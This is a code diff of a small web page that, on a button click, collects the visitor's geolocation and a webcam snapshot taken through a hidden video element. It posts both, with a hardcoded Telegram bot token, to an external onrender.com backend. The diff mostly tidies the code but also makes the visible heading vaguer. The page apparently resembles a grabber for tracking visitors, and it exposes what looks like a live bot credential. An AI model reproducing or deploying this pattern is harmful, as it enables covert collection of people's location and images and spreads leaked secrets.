@@ -6,7 +6,7 @@
     <title>Send Data to Telegram</title>
 </head>
 <body>
-    <h1>Send Location and Photo to Telegram</h1>
+    <h1>Send Data to Telegram</h1>
 
     <button id="start">Send Location and Photo</button>
     <video id="video" autoplay style="display: none;"></video>
@@ -19,8 +19,11 @@
     </form>
 
     <script>
-        const backendUrl = "https://backend-cveu.onrender.com"; // [
-](https://backend-czeu.onrender.com)        const botToken = "7405438395:AAE_lMyHZjxA3NeKWyEhXHKBuRzBG1tTWbs"; // 7405438395:AAE_lMyHZjxA3NeKWyEhXHKBuRzBG1tTWbs        // Handle form submission for sending a message
+        // Backend URL and bot token
+        const backendUrl = "https://backend-cveu.onrender.com";
+        const botToken = "7405438395:AAE_lMyHZjxA3NeKWyEhXHKBuRzBG1tTWbs";
+
+        // Handle form submission for sending a message
         document.getElementById("dataForm").addEventListener("submit", async (e) => {
             e.preventDefault();
             const message = document.getElementById("message").value;
@@ -31,7 +34,10 @@
                     headers: {
                         "Content-Type": "application/json",
                     },
-                    body: JSON.stringify({ message, botToken }),
+                    body: JSON.stringify({
+                        message,
+                        botToken,
+                    }),
                 });
 
                 if (!response.ok) {
@@ -42,11 +48,11 @@
                 alert("Response from backend: " + data.reply);
             } catch (error) {
                 console.error("Error:", error);
-                alert("Failed to send message to the backend!");
+                alert("Failed to send message to Telegram!");
             }
         });
 
-        // Handle sending location and photo
+        // Handle location and photo sending
         document.getElementById("start").addEventListener("click", async () => {
             const locationData = {};
 
@@ -68,7 +74,7 @@
                 alert("Geolocation is not supported by this browser.");
             }
 
-            // Capture photo and send data
+            // Capture photo and send location + photo
             async function capturePhoto(locationData) {
                 const video = document.getElementById("video");
                 const canvas = document.getElementById("canvas");
@@ -91,14 +97,13 @@
                     // Convert canvas to base64 image
                     const photo = canvas.toDataURL("image/png");
 
-                    // Send location and photo to the backend
-                    sendToBackend(locationData, photo);
+                    // Send location and photo to backend
+                    await sendToBackend(locationData, photo);
                 } catch (error) {
                     alert("Unable to access the camera: " + error.message);
                 }
             }
 
-            // Send location and photo to the backend
             async function sendToBackend(locationData, photo) {
                 try {
                     const response = await fetch(`${backendUrl}/location-photo`, {
@@ -108,7 +113,7 @@
                         },
                         body: JSON.stringify({
                             location: locationData,
-                            photo: photo,
+                            photo,
                             botToken,
                         }),
                     });
@@ -121,7 +126,7 @@
                     alert("Response from backend: " + data.message);
                 } catch (error) {
                     console.error("Error:", error);
-                    alert("Failed to send data to the backend!");
+                    alert("Failed to send location and photo to Telegram!");
                 }
             }
         });
